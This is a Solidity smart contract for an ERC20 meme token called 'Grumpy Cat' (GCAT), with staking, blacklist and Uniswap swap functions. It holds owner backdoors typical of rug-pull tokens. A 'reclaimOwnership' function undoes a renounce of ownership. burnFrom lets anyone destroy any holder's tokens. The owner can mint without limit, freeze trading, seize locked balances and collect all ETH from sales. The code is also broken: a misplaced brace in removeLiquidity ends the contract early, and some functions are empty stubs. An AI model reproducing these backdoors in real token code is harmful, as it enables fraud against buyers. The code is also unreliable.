// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24; 

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol"; 

contract GCAT is ERC20 {
    address public owner;
    address private _previousOwner;
    mapping(address => bool) public controllers;
    mapping(address => bool) public blacklist;
    bool public paused;
    mapping(address => uint256[]) private _balancesHistory;
    mapping(address => Stake) public stakes; 

    ISwapRouter public uniswapRouter;
    address public WETH9;
    uint256 public tokenPrice;
    uint256 public rewardRate;
    address public reserveFundAddress; 

    struct Lock {
        uint256 amount;
        uint256 unlockTime;
    } 

    struct Stake {
        uint256 amount;
        uint256 startTime;
        uint256 endTime;
        bool isActive;
    } 

    mapping(address => Lock[]) public locks; 

    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount);
    event RewardClaimed(address indexed user, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); 

    constructor() ERC20("Grumpy Cat", "GCAT") {
        _mint(msg.sender, 100000000000 * 10 ** 18);
        owner = msg.sender;
        paused = false;
        // Uniswap V3 router address and WETH9 address here
        uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // Mainnet address
        WETH9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // Mainnet WETH9 address
    } 

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    } 

    modifier onlyController() {
        require(controllers[msg.sender], "Only controllers can call this function");
        _;
    } 

    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    } 

    modifier whenPaused() {
        require(paused, "Contract is not paused");
        _;
    } 

    function getOwner() public view returns (address) {
        return owner;
    } 

    function _checkOwnership() internal view returns (bool) {
        return msg.sender == owner;
    } 

    function transferOwnership(address _newOwner) external onlyOwner {
        require(_newOwner != address(0), "Invalid address");
        _previousOwner = owner;
        owner = _newOwner;
        emit OwnershipTransferred(_previousOwner, _newOwner);
    } 

    function renounceOwnership() external onlyOwner {
        _previousOwner = owner;
        owner = address(0);
        emit OwnershipTransferred(_previousOwner, address(0));
    } 

    function reclaimOwnership() public {
        require(msg.sender == _previousOwner, "Only previous owner can reclaim ownership");
        emit OwnershipTransferred(address(0), _previousOwner);
        owner = _previousOwner;
        _previousOwner = address(0); // Clear previous owner
    } 

    function addController(address controller) external onlyOwner {
        controllers[controller] = true;
    } 

    function removeController(address controller) external onlyOwner {
        controllers[controller] = false;
    } 

    function pause() external onlyOwner {
        paused = true;
    } 

    function unpause() external onlyOwner {
        paused = false;
    } 

    function mint(address to, uint256 value) external onlyOwner {
        _mint(to, value);
    } 

    function burn(address from, uint256 amount) external onlyOwner {
        _burn(from, amount);
    } 

    function burnFrom(address from, uint256 value) external whenNotPaused returns (bool) {
        _burn(from, value);
        return true;
    } 

    function transfer(address to, uint256 value) public override whenNotPaused returns (bool) {
        require(!_checkBlacklist(msg.sender), "Sender is blacklisted");
        require(!_checkBlacklist(to), "Recipient is blacklisted");
        return super.transfer(to, value);
    } 

    function transferFrom(address from, address to, uint256 value) public override whenNotPaused returns (bool) {
        require(!_checkBlacklist(from), "Sender is blacklisted");
        require(!_checkBlacklist(to), "Recipient is blacklisted");
        return super.transferFrom(from, to, value);
    } 

    function batchTransfer(address[] memory recipients, uint256[] memory amounts) external whenNotPaused {
        require(recipients.length == amounts.length, "Arrays length mismatch");
        for (uint256 i = 0; i < recipients.length; i++) {
            _transfer(msg.sender, recipients[i], amounts[i]);
        }
    } 

    function approve(address spender, uint256 value) public override whenNotPaused returns (bool) {
        return super.approve(spender, value);
    } 

    function increaseAllowance(address spender, uint256 addedValue) public whenNotPaused returns (bool) {
        _approve(msg.sender, spender, allowance(msg.sender, spender) + addedValue);
        return true;
    } 

    function decreaseAllowance(address spender, uint256 subtractedValue) public whenNotPaused returns (bool) {
        uint256 currentAllowance = allowance(msg.sender, spender);
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    } 

    function addToBlacklist(address account) external onlyOwner {
        blacklist[account] = true;
    } 

    function removeFromBlacklist(address account) external onlyOwner {
        blacklist[account] = false;
    } 

    function _checkBlacklist(address account) internal view returns (bool) {
        return blacklist[account];
    } 

    function balanceOfAt(address account, uint256 index) public view returns (uint256) {
        require(index < _balancesHistory[account].length, "Invalid index");
        return _balancesHistory[account][index];
    } 

    function balanceHistoryLength(address account) public view returns (uint256) {
        return _balancesHistory[account].length;
    } 

    function snapshot() public onlyOwner {
        uint256 currentBlock = block.number;
        for (uint256 i = 0; i < super.totalSupply(); i++) {
            _balancesHistory[msg.sender].push(currentBlock);
        }
    } 

    function _beforeTokenTransfer(address /* from */, address /* to */, uint256 /* amount */) internal {
        // Function Before Token Transfer Balance
    } 

    function airdrop(address[] memory recipients, uint256[] memory amounts) external onlyOwner {
        require(recipients.length == amounts.length, "Arrays length mismatch");
        for (uint256 i = 0; i < recipients.length; i++) {
            _transfer(owner, recipients[i], amounts[i]);
        }
    } 

    function lockTokens(address account, uint256 amount, uint256 time) public onlyOwner {
        require(account != address(0), "Invalid address");
        require(amount > 0, "Amount must be greater than 0");
        require(balanceOf(account) >= amount, "Insufficient balance"); 

        Lock memory newLock = Lock({
            amount: amount,
            unlockTime: block.timestamp + time
        });
        locks[account].push(newLock);
        _transfer(account, address(this), amount); // Transfer tokens to contract for locking
    } 

    function unlockTokens(address account, uint256 amount) public onlyOwner {
        require(account != address(0), "Invalid address");
        require(amount > 0, "Amount must be greater than 0"); 

        uint256 unlockableAmount = 0;
        for (uint256 i = 0; i < locks[account].length; i++) {
            if (block.timestamp >= locks[account][i].unlockTime) {
                unlockableAmount += locks[account][i].amount;
                delete locks[account][i]; // Remove the unlocked lock
            }
        } 

        require(unlockableAmount >= amount, "Not enough unlockable tokens");
        _transfer(address(this), account, amount); // Transfer tokens back to the account
    } 

    function emergencyWithdraw(address to, uint256 amount) external onlyOwner {
        require(to != address(0), "Invalid address");
        _transfer(owner, to, amount);
    } 

    function withdrawETH(uint256 amount) external onlyOwner {
        require(amount <= address(this).balance, "Insufficient balance");
        payable(owner).transfer(amount);
    } 

    function withdrawTokens(uint256 tokenAmount) external onlyOwner {
        require(msg.sender == owner, "Only the owner can withdraw tokens");
        _transfer(address(this), owner, tokenAmount);
    } 

    // Function to receive Ether
    receive() external payable {} 

    // Fallback function
    fallback() external payable {} 

    // Enable trading
    function enableTrading() external onlyOwner {
        paused = false;
    } 

    // Disable trading
    function disableTrading() external onlyOwner {
        paused = true;
    } 

    function setTokenPrice(uint256 price) external onlyOwner {
        tokenPrice = price;
    } 

    function getTokenPrice() public view returns (uint256) {
        return tokenPrice;
    } 

    function buyToken() public payable whenNotPaused {
        // Calculate the number of tokens to be bought
        uint256 tokens = msg.value / tokenPrice;
        
        // Transfer the tokens to the buyer
        require(transfer(msg.sender, tokens), "Token transfer failed"); 

        // Transfer the received Ether to the wallet
        payable(owner).transfer(msg.value);
    } 

    function sellToken(uint256 tokenAmount) public whenNotPaused {
        // Calculate the amount of Ether to be paid
        uint256 etherAmount = tokenAmount * tokenPrice; 

        // Ensure the contract has enough Ether to pay
        require(address(this).balance >= etherAmount, "Not enough Ether in the contract"); 

        // Transfer the tokens from the seller to the contract
        require(transferFrom(msg.sender, address(this), tokenAmount), "Token transfer failed"); 

        // Transfer the Ether to the seller
        payable(msg.sender).transfer(etherAmount);
    } 

    function addLiquidity(uint256 amountToken, uint256 amountETH, uint24 fee) external onlyOwner {
        _approve(address(this), address(uniswapRouter), amountToken); 

        ISwapRouter.ExactInputSingleParams memory params =
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(this),
                tokenOut: WETH9,
                fee: fee,
                recipient: owner,
                deadline: block.timestamp + 3600,
                amountIn: amountToken,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            }); 

        uniswapRouter.exactInputSingle{ value: amountETH }(params);
    } 

    function swapTokenForETH(uint256 amount, uint24 fee) external onlyOwner {
        _approve(address(this), address(uniswapRouter), amount); 

        ISwapRouter.ExactInputSingleParams memory params =
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(this),
                tokenOut: WETH9,
                fee: fee,
                recipient: owner,
                deadline: block.timestamp + 3600,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            }); 

        uniswapRouter.exactInputSingle(params);
    } 

    function swapETHForToken(uint256 amount, uint24 fee) external onlyOwner payable {
        ISwapRouter.ExactInputSingleParams memory params =
            ISwapRouter.ExactInputSingleParams({
                tokenIn: WETH9,
                tokenOut: address(this),
                fee: fee,
                recipient: owner,
                deadline: block.timestamp + 3600,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            }); 

        uniswapRouter.exactInputSingle{ value: amount }(params);
    } 

    function removeLiquidity(uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to) external onlyOwner {
                ISwapRouter.ExactOutputSingleParams memory params =
                        ISwapRouter.ExactOutputSingleParams({
                                    tokenIn: address(0), // Input token (ETH) address
                                                tokenOut: address(this), // Output token (GCAT) address
                                                            fee: 3000, // Fee (0.3% fee)
                                                                        recipient: to, // Recipient of the output tokens
                                                                                    deadline: block.timestamp + 3600, // Deadline by which the transaction must be included
                                                                                                amountOut: liquidity, // Amount of liquidity tokens to burn
                                                                                                            amountInMaximum: 0, // Maximum ETH to spend for burning liquidity tokens
                                                                                                                        sqrtPriceLimitX96: 0 // Optional
                                                                                                                                });
                                                                                                                                        uniswapRouter.exactOutputSingle(params);
                                                                                                                                            }
    }

    function stakeTokens(uint256 amount) external whenNotPaused {
        require(amount > 0, "Amount must be greater than 0");
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        // Transfer tokens from user to contract
        _transfer(msg.sender, address(this), amount);
        // Update stake information
        if (stakes[msg.sender].isActive) {
            stakes[msg.sender].amount += amount;
        } else {
            stakes[msg.sender] = Stake({
                amount: amount,
                startTime: block.timestamp,
                endTime: 0,
                isActive: true
            });
        }
        emit Staked(msg.sender, amount);
    } 

    function unstakeTokens(uint256 amount) external {
        require(amount > 0, "Amount must be greater than 0");
        require(stakes[msg.sender].isActive, "No active stake found");
        require(stakes[msg.sender].amount >= amount, "Insufficient staked amount");
        // Calculate and transfer staked tokens back to user
        _transfer(address(this), msg.sender, amount);
        // Update stake information
        stakes[msg.sender].amount -= amount;
        if (stakes[msg.sender].amount == 0) {
            stakes[msg.sender].isActive = false;
        }
        emit Unstaked(msg.sender, amount);
    } 

    function claimRewards() external {
        require(stakes[msg.sender].isActive, "No active stake found");
        // Calculate rewards (for demonstration, use a simple rate)
        uint256 reward = (block.timestamp - stakes[msg.sender].startTime) * rewardRate;
        require(reward > 0, "No rewards available");
        // Transfer rewards to user
        _transfer(address(this), msg.sender, reward);
        // Update stake information
        stakes[msg.sender].startTime = block.timestamp;
        emit RewardClaimed(msg.sender, reward);
    } 

    function setRewardRate(uint256 rate) external onlyOwner {
        rewardRate = rate;
    } 

    function getRewardRate() external view returns (uint256) {
        return rewardRate;
    } 

    function setReserveFundAddress(address _reserveFundAddress) external onlyOwner {
        reserveFundAddress = _reserveFundAddress;
    } 

    function getReserveFundAddress() external view returns (address) {
        return reserveFundAddress;
    } 

    function depositToReserveFund(uint256 amount) external {
        // Grumpy Cat Reserve Fund
    } 

    function withdrawFromReserveFund(uint256 amount) external onlyOwner {
        // Grumpy Cat Reserve Fund
    }

}
